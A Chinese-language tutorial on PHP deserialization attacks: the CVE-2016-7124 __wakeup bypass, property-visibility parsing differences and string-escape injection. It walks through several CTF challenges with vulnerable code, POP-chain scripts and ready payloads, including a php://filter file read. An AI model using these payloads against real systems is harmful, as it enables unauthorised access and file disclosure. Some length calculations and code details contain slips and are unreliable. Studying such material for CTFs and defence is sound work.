---
title: PHP反序列化&字符逃逸&增多减少&成员变量属性&解析不敏感&Wakeup绕过
published: 2026-07-14
description: 主要内容为PHP反序列化漏洞利用：CVE-2016-7124（__wakeup绕过）通过篡改属性个数跳过方法执行；版本差异利用PHP 7.1+对protected/private属性的宽松解析；字符逃逸通过替换函数导致长度变化，实现属性注入。
tags:
  - 反序列化
  - PHP
  - Web攻防
category: 网络安全
draft: false
---

# 知识点

1. WEB攻防-PHP反序列化-CVE&wakeup绕过
2. WEB攻防-PHP反序列化-版本属性解析差异
3. WEB攻防-PHP反序列化-字符增多减少逃逸

# PHP版本绕过漏洞

`CVE-2016-7124（__wakeup绕过）`

漏洞编号：CVE-2016-7124

影响版本：PHP 5<5.6.25; PHP 7<7.0.10

漏洞危害：如存在__wakeup方法，调用unserilize()方法前则先调用__wakeup方法，但序列化字符串中表示对象属性个数的值大于真实属性个数时会跳过__wakeup执行

## `__wakeup绕过`Demo

cve.php：

```php
<?php  
// __wakeup：反序列化恢复对象之前调用该方法  
// CVE-2016-7124 __wakeup绕过  
class Test  
{  
    public $name;  
    public $age;  
    public $gender;  
  
    public function __construct($name, $age, $gender)  
    {  
        echo "__construct被调用！<br>";  
    }  
  
    public function __wakeup()  
    {  
        echo "__wakeup被调用！<br>";  
    }  
  
    public function __destruct()  
    {  
        echo "__destruct被调用！<br>";  
    }  
}  
  
//$t = new Test("xx",24,"man");  
//echo serialize($t);  
unserialize($_GET['x']);
```

变量属性个数为等于或者小于真实属性个数：

```
cve.php?x=O:4:"Test":3:{s:4:"name";N;s:3:"age";N;s:6:"gender";N;}

页面显示：
__wakeup被调用！  
__destruct被调用！
```

变量属性个数大于真实属性个数：

```
cve.php?x=O:4:"Test":4:{s:4:"name";N;s:3:"age";N;s:6:"gender";N;}

页面显示：
__destruct被调用！
```

案例：

## `[极客大挑战 2019]`PHP

1、下载源码分析，触发flag条件

2、分析会触发调用__wakeup 强制username值

3、利用语言漏洞绕过 CVE-2016-7124

4、构造payload后 修改满足漏洞条件触发

index.php：

```php
// 只展示关键代码部分
include 'class.php';
$select = $_GET['select'];
$res = unserialize(@select);
```

class.php：

```php
<?php  
class Name  
{  
    private $username = 'nonono';  
    private $password = 'yesyes';  
  
    public function __construct($username, $password)  
    {  
        $this->username = $username;  
        $this->password = $password;  
    }  
  
    function __wakeup()  
    {  
        $this->username = 'guest';// 如果不绕过wakeup，username就会为guest，从而无法实现下面的username===admin
    }  
  
    function __destruct()  
    {  
        if ($this->password != 100){  // 必须要让密码=100
            echo "<br>no！！hacker！！</br>";  
            echo "your name is：";  
            echo $this->username;echo "<br>";  
            echo "your pass is：";  
            echo $this->password;echo "<br>";  
            die();  
        }  
        if ($this->username === 'admin'){  // username改为admin，但是需要绕过wakeup，因为先执行wakeup
            global $flag;  
            echo $flag;  
        }else{  
            echo "no flag here";  
            die();  
        }  
    }  
}
```

经过分析：网站使用的版本为php5.3.3

代码分析：拿到flag需要修改username和password的值，而wakeup会将传入修改过的值变为guest，所以需要绕过wakeup

因此可以通过将传入的序列化值的变量属性个数修改为大于实际的变量属性个数，实现绕过

POP链：

```php
class Name  
{  
    private $username = 'admin';  
    private $password = 100;  
}  
  
$test = new Name();  
echo urlencode(serialize($test));

// 原始数据
O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D

//将变量属性值改为2以上的即可
O%3A4%3A%22Name%22%3A6%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
```


Payload：

```
select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
```

# PHP版本绕过机制

影响版本：**PHP7.1+**

->变量属性不同序列化数据差异

## *对象变量属性

public(公共的):在本类内部、外部类、子类都可以访问

protected(保护的):只有本类或子类或父类中可以访问

private(私人的):只有本类内部可以使用

## *序列化数据显示

public属性序列化的时候格式是正常成员名

private属性序列化的时候格式是%00类名%00成员名

protected属性序列化的时候格式是%00*%00成员名

```php
<?php  
class Test  
{  
    public $gender = 'man';  
    private $age = 20;  
    protected $name = 'admin';  
}  
  
$a = new Test();  
echo serialize($a);

// 打印结果
`O:4:"Test":3:{s:6:"gender";s:3:"man";s:9:" Test age";i:20;s:7:" * name";s:5:"admin";}`
```

->PHP版本导致的属性不同反序列化解析差异

```php
<?php  
class Test  
{  
    protected $a;  
    private $b;  
  
    public function __construct()  
    {  
        $this->a = 'test';  // a的值为test
    }  
  
    public function __destruct()  
    {  
        echo $this->a;  // 输出a的值
    }  
}  
  
//echo serialize(new Test());  
unserialize('O:4:"Test":1:{s:1:"a";s:4:"test";}');// 反序列化此处的a为公共属性
// 如果是正常的protected类型，那么此处应该为
// s:4:%00*%00a
```

反序列化的数据中`a`明显是public的写法，但是如果php的版本在7.1以上，就会把反序列化之后的结果输出：`test`

如果小于7.1版本就是空白，也就是没有执行代码

```
s:1:"a"
```

案例：

## `[网鼎杯 2020 青龙组]`AreUSerialz

1、__destruct()--> process()-->read()

2、绕过is_valid()函数，private和protected属性经过序列化都存在不可打印字符在32-125之外

```php
<?php  
include("flag.php");  
highlight_file(__FILE__);  
class FileHandler {  
    protected $op;  
    protected $filename;  
    protected $content;  

    function __construct() {  
        $op = "1";  
        $filename = "/tmp/tmpfile";  
        $content = "Hello World!";  
        $this->process();  
    }  
  
    public function process() {  
        if($this->op == "1") {  
            $this->write();  
        } else if($this->op == "2") {  
            $res = $this->read();  
            $this->output($res);  
        } else {  
            $this->output("Bad Hacker!");  
        }  
    }  
  
    private function write() {  
        if(isset($this->filename) && isset($this->content)) {  
            if(strlen((string)$this->content) > 100) {  
                $this->output("Too long!");  
                die();  
            }  
            $res = file_put_contents($this->filename, $this->content);  
            if($res) $this->output("Successful!");  
            else $this->output("Failed!");  
        } else {  
            $this->output("Failed!");  
        }  
    }  
  
    private function read() {  
        $res = "";  
        if(isset($this->filename)) {  
            $res = file_get_contents($this->filename);  
        }  
        return $res;  
    }  
  
    private function output($s) {  
        echo "[Result]: <br>";  
        echo $s;  
    }  
  
    function __destruct() {  
        if($this->op === "2")  
            $this->op = "1";  
        $this->content = "";  
        $this->process();  
    }  
  
}  
  
function is_valid($s) {  
    for($i = 0; $i < strlen($s); $i++)  
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))  
            return false;  
    return true;  
}  
  
if(isset($_GET{'str'})) {  
  
    $str = (string)$_GET['str'];  
    if(is_valid($str)) {  
        $obj = unserialize($str);  
    }  
}
```

代码逻辑推理：

```
__destruct()，控制内容为空，因此不能进行写内容，
但是__destruct()会触发process()
->
process()判断如果op==2就读取
->
需要控制读取的filename

但是在序列化数据的时候需要注意到is_valid()会检测内容是否出现了一些特殊符号等进行拦截，比如protected经过序列化会出现%00*%00成员名
因此这时候就需要使用公共属性来绕过
```

POP链：

```php
<?php  
class FileHandler  
{  
    public $op = 2;  
    public $filename = "php://filter/read=convert.base64-encode/resource=flag.php";  
    public $content;  
}  
  
$obj = new FileHandler();  
echo serialize($obj);  
  
//PD9waHAgJGZsYWc9J0NURjJ7MmY1YWVjYzMtZTdhZS00MGRmLTg4ZDQtNjk0MmRhNmI0Y2NlfSc7Cg==
```

# PHP字符增多减少逃逸

## 字符变多

str1.php、str1-pop.php

运算思路：字符个数多了1个

后续有47个就写47个覆盖后续

str1.php：

```php
<?php  
class user  
{  
    public $username;  
    public $password;  
    public $isVIP;  
  
    public function __construct($u,$p)  
    {  
        $this->username = $u;  
        $this->password = $p;  
        $this->isVIP = 0;  
    }  
  
    function login()  
    {  
        $isVip = $this->isVIP;  
        if ($isVip == 1) {  
            echo "flag here";  
        }else{  
            echo "fuck";  
        }  
    }  
}  
  
function filter($obj)  
{  
    return preg_replace("/admin/","hacker",$obj);  
}  
  
// 你必须输入admin  
$obj = $_GET['x'];  
if (isset($obj)) {  
    $o = unserialize(filter($obj));  // 这样filter()处理的是原始的序列化字符串（替换其中的 `admin` 为 `hacker`），然后再反序列化触发漏洞。
	$o->login();  
}  
```

str1-pop.php：

```php
<?php 
$u = 'adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"psswrd";s:5:"isVIP";i:1;}';  
$p = 'passwd'; 
  
$obj = new user($u,$p);  
print_r(serialize($obj));
```

这里的`username = admin，admin是5位，47*5 + ";s:8:"password";s:6:"passwd";s:5:"isVIP";i:1;} 这部分是47位 = 282位 `` 

修改的`username = hacker，hacker是6位，47*6 = 282位，刚好让主要部分isVIP被解析，所以造成了逃逸` 

绕过逻辑：  

需要让 admin 变成 hacker 后增加的长度恰好等于注入的那段payload的长度  

每个 admin(5字符) → hacker(6字符)，增加 1个字符  

payload:`";s:8:"password";s:6:"passwd";s:5:"isVIP";i:1;}`长度是 47个字符  

所以需要 47个 admin，替换后增加47个字符，刚好吞掉payload

## 字符变少

str2.php、str2-pop.php

运算思路：字符个数少了1个（5位变4位）

思考写多个就截取后续多少个，如23个等

str2.php：

```php
<?php  
class user  
{  
    public $username;  
    public $password;  
    public $isVIP;  
  
    public function __construct($u,$p)  
    {  
        $this->username = $u;  
        $this->password = $p;  
        $this->isVIP = 0;  
    }  
  
    function login()  
    {  
        $isVip = $this->isVIP;  
        if ($isVip == 1) {  
            echo "flag here";  
        }else{  
            echo "fuck";  
        }  
    }  
}  
  
function filter($obj)  
{  
    return preg_replace("/admin/","hack",$obj);  
}  
  
// 你必须输入admin  
$obj = $_GET['x'];  
if (isset($obj)) {  
    $o = unserialize(filter($obj));  
    $o->login();  
}
```

str2-pop.php：

```php
$test = new user($u,$p);  
$test_ser = serialize($test);  
$test_ser_filter = filter($test_ser);
  
echo $test_ser;  
  
// O:4:"user":3:{s:8:"username";s:115:"adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:47:"";s:8:"password";s:6:"passwd";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}  

// O:4:"user":3:{s:8:"username";s:115:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"passwd";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}

// hackhackhack...（92字符） + `";s:8:"password";s:47:"`（23字符） = 115字符 + 见下方
// + 之后就是想操控的数据`";s:8:"password";s:6:"passwd";s:5:"isVIP";i:1;}`
// hack 部分比 admin 部分少了 23 个字符，因此需要把后面原本属于 password 字段前缀的 `";s:8:"password";s:47:"` 这 23 个字符拼进 username 里，凑满 s:115，从而实现字符串逃逸，让后续的 `isVIP` 被解析成 1
```

## 增多型计算

每个admin变hacker，长度从5变6，增加1个字符。

需要让username字段多出来的字符恰好是payload的长度。

payload = `";s:8:"password";s:6:"passwd";s:5:"isVIP";i:1;}`

你需要这个payload的长度，假设是L。

需要admin的个数 = L / 1 = L个。

因为每个admin变成hacker增加1个字符，L个就增加L个字符。

这L个字符恰好就是payload本身。

所以构造：`str_repeat('admin', L) . payload`

## 减少型计算

每个admin变hack，长度从5变4，减少1个字符。

你需要username字段减少的字符数恰好等于要吞掉的内容长度。

要吞掉的内容 = `";s:8:"password";s:6:"passwd";s:5:"isVIP";i:1;}`

假设这个长度是M。

需要hacker的个数 = M / 1 = M个。

因为每个admin变成hack减少1个字符，M个就减少M个字符。

减少的M个字符恰好吞掉了后面的M个字符。

所以构造：`str_repeat('hacker', M) . '";s:8:"password";s:6:"123456";}' . 要吞掉的内容`

案例：

## CTFSHOW-Web262（逃逸解法）

解题思路：提示有message.php

其中获取msg获取f,m,t 要求token=admin

字符增多通过本地序列化发现62位需要覆盖

靶场代码：

```php
<?php  
error_reporting(0);  
class message  
{  
    public $from;  
    public $msg;  
    public $to;  
    public $token = 'user';  
  
    public function __construct($f,$m,$t)  
    {  
        $this->from = $f;  
        $this->msg = $m;  
        $this->to = $t;  
    }  
}  
  
$f = $_GET['f'];  
$m = $_GET['m'];  
$t = $_GET['t'];  
  
if (isset($f) && isset($m) && isset($t)) {  
    $msg = new massage($f,$m,$t);  
    $umsg = str_replace('fuck','loveU',serialize($msg));  
    setcookie('msg',base64_encode($umsg));  
    echo 'Your message has been sent!';  
}  
  
highlight_file(__FILE__);
```

message.php：

```php
class message  
{  
    public $from;  
    public $msg;  
    public $to;  
    public $token = 'user';  
  
    public function __construct($f,$m,$t)  
    {  
        $this->from = $f;  
        $this->msg = $m;  
        $this->to = $t;  
    }  
}  
  
if (isset($_COOKIE['msg'])){  
    $msg = unserialize(base64_decode($_COOKIE['msg']));  
    if ($msg->token == 'admin'){  
        echo $flag;  
    }  
}
```

分析代码得知，这是一个增多型计算，把`fuck`，替换为了`loveU`，只要把token改为`admin`即可获取到flag

先观察原型：

```
//原型
O:7:"message":4:{s:4:"from";s:4:"fuck";s:3:"msg";s:1:"x";s:2:"to";s:1:"y";s:5:"token";s:4:"user";}
//如果将token改为admin
O:7:"message":4:{s:4:"from";s:4:"fuck";s:3:"msg";s:1:"x";s:2:"to";s:1:"y";s:5:"token";s:5:"admin";}
```

`";s:3:"msg";s:1:"x";s:2:"to";s:1:"y";s:5:"token";s:5:"admin";}`，发现为了凑齐长度，需要把这 62 个字符全部变成某个字段的值

```
// fuck
62个fuck = 248 
62个fuck + ";s:3:"msg";s:1:"x";s:2:"to";s:1:"y";s:5:"token";s:5:"admin";} = 310
所以生成的为：
62个fuck
+ ";s:3:"msg";s:1:"x";s:2:"to";s:1:"y";s:5:"token";s:5:"admin";}// payload主要部分
+ ";s:3:"msg";s:1:"x";s:2:"to";s:1:"y";s:5:"token";s:4:"user";}// 默认拼接

// loveu
62个loveu = 310
那么拼接的这段";s:3:"msg";s:1:"x";s:2:"to";s:1:"y";s:5:"token";s:5:"admin";}就会被正常解析
```